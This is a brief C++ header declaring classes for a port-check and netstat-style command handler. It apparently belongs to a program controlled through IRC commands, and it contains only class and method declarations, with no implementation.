#ifndef __CHECK_H__
#define __CHECK_H__

#include <iphlpapi.h>
#include "commands.h"
#include "message.h"
#include "irc.h"


class CDisplay
{
public:
	CDisplay() { }
	~CDisplay() { }
	unsigned char allConnectAndListening;
	unsigned char ethernetStatistics;
	char          specificProtocol[16];
	unsigned char routingTable;
	unsigned char perProtocolStatistics;
};
class CNetstat 
{
public:
	CDisplay *display;
	CNetstat() { display = new CDisplay; }
	~CNetstat() { }
	unsigned char dontResolve;
	
	int interval;
};

class CPortCheck : public CCommandHandler
{
public:
	void Init();

	CPortCheck();
	~CPortCheck() { };
	bool HandleCommand(CMessage *pMsg);

	void CheckPort (int iPort);
	void ResolveAddress (unsigned long addr, char *buf, unsigned long bufSize, unsigned char isSrcAddress);
	command m_cmdCheck;
	
	CNetstat *netstat;

protected:
	int iPort;
};
#endif
